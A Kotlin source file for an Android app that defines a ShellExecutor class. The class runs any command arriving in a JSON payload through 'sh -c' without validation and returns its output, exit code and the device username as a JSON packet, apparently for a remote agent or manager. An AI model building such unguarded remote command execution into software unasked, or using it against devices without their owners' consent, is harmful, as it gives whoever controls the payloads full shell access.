package com.zenvora.agent.manager

import android.content.Context
import android.os.Build
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class ShellExecutor(private val context: Context) {
    private val sessions = mutableMapOf<String, File>()

    fun execute(payload: JSONObject): JSONObject {
        val command = payload.optString("command").trim()
        val shellId = payload.optString("shellId")
        val cwd = resolveCwd(shellId)

        if (command.isEmpty()) {
            return shellPacket(
                action = "SHELL_EXECUTE",
                status = "error",
                message = "No shell command provided.",
                command = "",
                exitCode = 1,
                stdout = "",
                stderr = "No shell command provided.",
                cwd = cwd.absolutePath,
                shellId = shellId,
                timedOut = false
            )
        }

        val cdMatch = Regex("^cd\\s+(.+)$", RegexOption.IGNORE_CASE).matchEntire(command)
        if (cdMatch != null) {
            val target = resolvePath(cwd, cdMatch.groupValues[1].trim().trim('"', '\''))
            if (target.isDirectory) {
                setCwd(shellId, target)
                return shellPacket(
                    action = "SHELL_EXECUTE",
                    status = "success",
                    message = "Shell command completed.",
                    command = command,
                    exitCode = 0,
                    stdout = target.absolutePath,
                    stderr = "",
                    cwd = target.absolutePath,
                    shellId = shellId,
                    timedOut = false
                )
            }
            return shellPacket(
                action = "SHELL_EXECUTE",
                status = "error",
                message = "Shell command failed.",
                command = command,
                exitCode = 1,
                stdout = "",
                stderr = "Not a directory: ${target.absolutePath}",
                cwd = cwd.absolutePath,
                shellId = shellId,
                timedOut = false
            )
        }

        val process = ProcessBuilder("sh", "-c", command)
            .directory(cwd)
            .redirectErrorStream(false)
            .start()
        val timedOut = if (Build.VERSION.SDK_INT >= 26) {
            !process.waitFor(180, TimeUnit.SECONDS)
        } else {
            process.waitFor()
            false
        }
        if (timedOut) process.destroyForcibly()
        val stdout = process.inputStream.bufferedReader().readText().take(512 * 1024)
        val stderr = process.errorStream.bufferedReader().readText().take(128 * 1024)
        val code = if (timedOut) 124 else process.exitValue()
        return shellPacket(
            action = payload.optString("action").ifBlank { "SHELL_EXECUTE" },
            status = if (code == 0) "success" else "error",
            message = if (code == 0) "Shell command completed." else "Shell command failed.",
            command = command,
            exitCode = code,
            stdout = stdout,
            stderr = stderr,
            cwd = cwd.absolutePath,
            shellId = shellId,
            timedOut = timedOut
        )
    }

    private fun resolveCwd(shellId: String): File {
        if (shellId.isNotBlank()) {
            sessions[shellId]?.let { return it }
        }
        return context.getExternalFilesDir(null) ?: context.filesDir
    }

    private fun setCwd(shellId: String, dir: File) {
        if (shellId.isNotBlank()) sessions[shellId] = dir
    }

    private fun resolvePath(cwd: File, raw: String): File {
        val file = File(raw)
        return if (file.isAbsolute) file else File(cwd, raw)
    }

    private fun shellPacket(
        action: String,
        status: String,
        message: String,
        command: String,
        exitCode: Int,
        stdout: String,
        stderr: String,
        cwd: String,
        shellId: String,
        timedOut: Boolean
    ): JSONObject {
        val stdoutChunks = JSONArray()
        if (stdout.isNotEmpty()) stdoutChunks.put(stdout)
        val stderrChunks = JSONArray()
        if (stderr.isNotEmpty()) stderrChunks.put(stderr)
        return JSONObject().apply {
            put("type", "shell_output")
            put("action", action)
            put("status", status)
            put("message", message)
            put(
                "shell",
                JSONObject()
                    .put("command", command)
                    .put("exit_code", exitCode)
                    .put("stdout", stdout)
                    .put("stderr", stderr)
                    .put("stdoutChunks", stdoutChunks)
                    .put("stderrChunks", stderrChunks)
                    .put("username", Build.USER.ifBlank { "android" })
                    .put("cwd", cwd)
                    .put("shellId", shellId)
                    .put("shell", "sh")
                    .put("timed_out", timedOut)
            )
        }
    }
}
